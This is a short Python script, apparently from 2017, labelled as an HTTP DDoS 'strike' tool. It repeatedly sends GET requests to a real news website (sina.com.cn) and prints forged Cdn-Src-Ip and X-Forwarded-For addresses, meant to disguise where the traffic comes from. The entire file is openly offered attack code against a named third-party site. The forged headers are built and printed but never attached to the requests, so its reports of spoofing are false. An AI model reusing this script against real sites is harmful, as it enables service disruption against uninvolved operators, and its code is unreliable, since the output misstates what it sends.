# -*-coding: utf-8-*-
# @Time    : 2017/4/13 10:11
# @Author  : Haoranz
# @Function: Simulate HTTP DDoS Strike with CDN-SRC-IP and XFF IP.

import requests

# Modify the Attack Target URL Here.
url = "http://www.sina.com.cn/"
# Modify the Attach Times Here.
attackTimes = 10

def main():
    host = url.split('/',3)[2]
    s = requests.Session()
    # Attack Logic
    for x in range(1, attackTimes + 1):
        # Cdn-Src-Ip字段
        CdnSrcIp = "111.111.111." + str(x) + ",112.112.112." + str(x)
        # X-Forwarded-For字段
        XFFIp = "221.221.221." + str(x) + ",222.222.222." + str(x)  
        ddosRequest = sendRequest(x,host)
        res = s.send(ddosRequest)
        if (res.text):
            print("Attack finished " + str(x) + " times.  And Cdn-Src-Ip is "+CdnSrcIp +" X-Forwarded-For is "+XFFIp)

def sendRequest(x,host):
    headers = {
        "Host": str(host), "Connection": "keep-alive", "Cache-Control": "max-age=0",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Encoding": "gzip, deflate, sdch", "Accept-Language": "zh-CN,zh;q=0.8",
               "Cookie": "wp-settings-9=mfold%3Do%26libraryContent%3Dbrowse%26editor%3Dtinymce%26dfw_width%3D822; wp-settings-time-9=1486447106",
               "If-None-Match": "444e9-3b-53 cd8e4152373", "If-Modified-Since": "Mon, 19 Sep 2016 09:25:20 GMT",
               }
    ddosRequest = requests.Request('GET', url, headers=headers).prepare()
    return ddosRequest

if __name__ == "__main__":  
    main()
